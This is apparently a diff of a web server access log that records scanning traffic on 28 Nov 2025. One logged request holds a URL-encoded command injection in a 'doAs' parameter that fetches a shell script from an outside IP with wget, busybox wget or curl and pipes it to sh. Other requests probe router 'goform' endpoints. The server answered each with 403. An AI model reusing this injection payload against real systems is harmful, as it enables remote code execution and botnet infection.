@@ -241,3 +241,5 @@
 192.159.99.95 - - [28/Nov/2025:17:34:14 +0800] "GET /?doAs=%60%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.pms.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.pms.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.pms.sh%29%7Csh%60 HTTP/1.1" 403 0 "-" "Mozilla/5.0 (rondo2012@atomicmail.io)" "-"
 192.159.99.95 - - [28/Nov/2025:17:34:15 +0800] "POST /goform/formJsonAjaxReq HTTP/1.1" 403 340 "http://47.237.7.51:8080/home.asp" "Mozilla/5.0 (rondo2012@atomicmail.io)" "-"
 182.2.4.191 - - [28/Nov/2025:17:34:40 +0800] "GET / HTTP/1.1" 403 253 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
+110.78.134.160 - - [28/Nov/2025:17:48:02 +0800] "GET / HTTP/1.1" 403 340 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "-"
+45.38.44.221 - - [28/Nov/2025:17:53:08 +0800] "POST /goform/set_LimitClient_cfg HTTP/1.1" 403 253 "-" "Go-http-client/1.1" "-"
